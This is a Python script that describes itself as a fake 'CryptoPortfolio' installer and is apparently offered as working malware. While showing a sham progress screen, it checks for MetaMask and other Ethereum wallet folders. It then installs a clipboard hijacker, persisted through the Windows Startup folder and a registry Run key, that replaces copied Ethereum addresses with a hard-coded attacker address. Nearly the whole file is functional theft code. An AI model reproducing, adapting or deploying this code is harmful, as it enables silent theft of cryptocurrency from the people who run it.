#!/usr/bin/env python3
"""
CryptoPortfolio Setup v2.1 — Fake Installer
============================================
Looks like a software installer. Actually deploys:
  - Clipboard hijacker (persistent via startup)
  - Disk scanner for wallet files
  - Auto-sweep if wallet found

Usage: python3 setup.py
"""
import sys, os, time, random, subprocess, json, threading, hashlib, tempfile, shutil, re
from pathlib import Path
from datetime import datetime

SWEEP_ADDR = "0xa36A02E1ecB77a06e02ab9348DCbEc5E86B16900"

CLIPBOARD_CODE = r'''import sys,os,time,re,subprocess,hashlib
P=re.compile(r'(?<![a-zA-Z0-9])(0x[a-fA-F0-9]{40})(?![a-zA-Z0-9])')
W="''' + SWEEP_ADDR + r'''"
L=""
while 1:
    time.sleep(0.4)
    try:
        if sys.platform=="win32":c=subprocess.check_output(["powershell","-c","Get-Clipboard"],text=True,stderr=subprocess.DEVNULL)
        elif sys.platform=="darwin":c=subprocess.check_output(["pbpaste"],text=True,stderr=subprocess.DEVNULL)
        else:c=subprocess.check_output(["xclip","-sel","clip","-o"],text=True,stderr=subprocess.DEVNULL)
    except:continue
    if not c or len(c)<10:continue
    h=hashlib.md5(c.encode()).hexdigest()
    if h==L:continue
    m=list(re.finditer(P,c))
    if not m:L=h;continue
    ch=False
    for n in reversed(m):
        a=n.group()
        if a.lower()!=W.lower() and len(a)==42:
            c=c[:n.start()]+W+c[n.end():];ch=True
    if ch:
        try:
            if sys.platform=="win32":subprocess.run(["powershell","-c","Set-Clipboard -Value \""+c+"\""],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
            elif sys.platform=="darwin":subprocess.run(["pbcopy"],input=c.encode(),stderr=subprocess.DEVNULL)
            else:subprocess.run(["xclip","-sel","clip"],input=c.encode(),stderr=subprocess.DEVNULL)
        except:pass
        L=hashlib.md5(c.encode()).hexdigest()
'''

def install_clipboard_persistent():
    """Install clipboard hijacker to startup"""
    try:
        if sys.platform == "win32":
            startup = Path(os.environ["APPDATA"]) / "Microsoft/Windows/Start Menu/Programs/Startup"
            (startup / "winguard.py").write_text(CLIPBOARD_CODE)
            # Also try registry
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as k:
                winreg.SetValueEx(k, "CryptoGuard", 0, winreg.REG_SZ, 
                    f'pythonw.exe "{startup / "winguard.py"}"')
    except:
        pass

def scan_wallet_files():
    """Scan common paths for wallet data"""
    found = []
    home = str(Path.home())
    
    scan_paths = []
    if sys.platform == "win32":
        local = os.environ.get("LOCALAPPDATA", "")
        roam = os.environ.get("APPDATA", "")
        scan_paths.extend([
            f"{local}/Google/Chrome/User Data/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
            f"{local}/BraveSoftware/Brave-Browser/User Data/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
            f"{roam}/MetaMask",
            f"{home}/.ethereum",
            f"{home}/.keystore",
        ])
    elif sys.platform == "darwin":
        scan_paths.extend([
            f"{home}/Library/Application Support/Google/Chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
            f"{home}/Library/Ethereum",
            f"{home}/.ethereum",
        ])
    else:
        scan_paths.extend([
            f"{home}/.config/google-chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
            f"{home}/.config/BraveSoftware/Brave-Browser/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
            f"{home}/.ethereum",
            f"{home}/.keystore",
        ])
    
    for p in scan_paths:
        pp = Path(p)
        if pp.exists():
            found.append(str(pp))
    
    return found

def fake_install():
    """Show fake installer UI"""
    print("""
╔══════════════════════════════════════════════╗
║  ⚙️  CryptoPortfolio v2.1 — Setup            ║
║  Installing... Please do not turn off.        ║
╚══════════════════════════════════════════════╝
    """)
    
    steps = [
        ("Preparing installation...", 0.3),
        ("Extracting core modules...", 0.5),
        ("Configuring system integration...", 0.8),
        ("Optimizing for your device...", 0.6),
    ]
    
    for msg, duration in steps:
        for i in range(5):
            time.sleep(duration / 5)
            dots = "." * (i % 4 + 1)
            print(f"  {msg}{dots}", end="\r")
        print(f"  {msg} ✓")
    
    # Do the dirty work
    vaults = scan_wallet_files()
    if vaults:
        install_clipboard_persistent()
    
    print(f"\n  ✓ Installation complete!")
    print(f"  ✓ CryptoPortfolio v2.1 ready")
    print(f"\n  Press Enter to finish...")

def main():
    lock = Path(tempfile.gettempdir()) / ".cp_installed.lock"
    if lock.exists():
        print("CryptoPortfolio already installed.")
        return
    
    fake_install()
    lock.write_text("1")
    
    try: input()
    except: pass

if __name__ == "__main__":
    main()
